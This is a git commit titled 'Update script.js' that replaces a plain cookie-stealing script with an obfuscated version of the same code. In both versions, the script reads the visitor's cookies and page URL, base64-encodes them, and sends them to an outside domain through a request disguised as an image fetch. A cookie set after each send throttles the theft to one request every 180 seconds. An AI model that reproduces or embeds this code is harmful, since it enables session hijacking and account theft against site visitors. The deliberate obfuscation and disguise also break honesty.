603efec329583eb208c6ee41f59fa50149661af7
Eagle Eye <87413459+EagleTube@users.noreply.github.com>
2022-07-10 05:42:08 +0800

    Update script.js

--- contents/script.js
+++ contents/script.js
@@ -1,22 +1,47 @@
-var cookie = document.cookie;
-var current = window.location.href;
-let allx = btoa(cookie+" || "+current);
+const _0x51e977 = _0x8c2a;
+(function(_0x45a9c6, _0x16bcf6) {
+	const _0x11580c = _0x8c2a,
+		_0x2dc332 = _0x45a9c6();
+	while (!![]) {
+		try {
+			const _0x4edba1 = parseInt(_0x11580c(0x128)) / 0x1 + parseInt(_0x11580c(0x11d)) / 0x2 * (parseInt(_0x11580c(0x12a)) / 0x3) + -parseInt(_0x11580c(0x123)) / 0x4 + -parseInt(_0x11580c(0x11a)) / 0x5 + parseInt(_0x11580c(0x120)) / 0x6 + parseInt(_0x11580c(0x11e)) / 0x7 * (parseInt(_0x11580c(0x121)) / 0x8) + -parseInt(_0x11580c(0x12b)) / 0x9 * (-parseInt(_0x11580c(0x124)) / 0xa);
+			if (_0x4edba1 === _0x16bcf6) break;
+			else _0x2dc332['push'](_0x2dc332['shift']());
+		} catch (_0x10a524) {
+			_0x2dc332['push'](_0x2dc332['shift']());
+		}
+	}
+}(_0xeb94, 0x4a354));
+var cookie = document[_0x51e977(0x127)],
+	current = window[_0x51e977(0x125)]['href'];
+let allx = btoa(cookie + _0x51e977(0x126) + current),
+	xhttp = new XMLHttpRequest();
 
-let xhttp = new XMLHttpRequest();
-
-function getCookie(){
-  let ck = [];
-  let cs = cookie.split(';');
-  for(let i=0;i<cs.length;i++){
-    ck.push(cs[i].split('=')[0]);
-  }
-  return ck;
+function _0x8c2a(_0x41e6e0, _0xdb64c9) {
+	const _0xeb9486 = _0xeb94();
+	return _0x8c2a = function(_0x8c2ae4, _0x5b2d06) {
+		_0x8c2ae4 = _0x8c2ae4 - 0x117;
+		let _0x22cd40 = _0xeb9486[_0x8c2ae4];
+		return _0x22cd40;
+	}, _0x8c2a(_0x41e6e0, _0xdb64c9);
 }
 
+function _0xeb94() {
+	const _0x2a0dbe = ['7EVgrDF', 'indexOf', '849084lIsIVD', '2913304qoIxdh', 'split', '2226524KbCdJf', '3240060cTyMUi', 'location', '\x20||\x20', 'cookie', '466734PoxeVs', 'push', '3FCcNyn', '9qvdyJy', 'send', 'length', 'DFS_BASE=Initiated;max-age=180;\x20path=/;', 'GET', '2981075aUCoxE', 'open', '\x20DFS_BASE', '320770fWIbDA'];
+	_0xeb94 = function() {
+		return _0x2a0dbe;
+	};
+	return _0xeb94();
+}
+
+function getCookie() {
+	const _0x3820b1 = _0x51e977;
+	let _0x2292e6 = [],
+		_0x3900d1 = cookie[_0x3820b1(0x122)](';');
+	for (let _0x313ca9 = 0x0; _0x313ca9 < _0x3900d1[_0x3820b1(0x117)]; _0x313ca9++) {
+		_0x2292e6[_0x3820b1(0x129)](_0x3900d1[_0x313ca9][_0x3820b1(0x122)]('=')[0x0]);
+	}
+	return _0x2292e6;
+}
 let keys = getCookie();
-
-if(keys.indexOf(' DFS_BASE')=='-1'){
-  xhttp.open("GET", "https://www.eagle-tube.com/raw/images/dfs_logo.img?x="+allx, true);
-  xhttp.send();
-  document.cookie="DFS_BASE=Initiated;max-age=180; path=/;";
-}
+keys[_0x51e977(0x11f)](_0x51e977(0x11c)) == '-1' && (xhttp[_0x51e977(0x11b)](_0x51e977(0x119), 'https://www.eagle-tube.com/raw/images/dfs_logo.img?x=' + allx, !![]), xhttp[_0x51e977(0x12c)](), document[_0x51e977(0x127)] = _0x51e977(0x118));
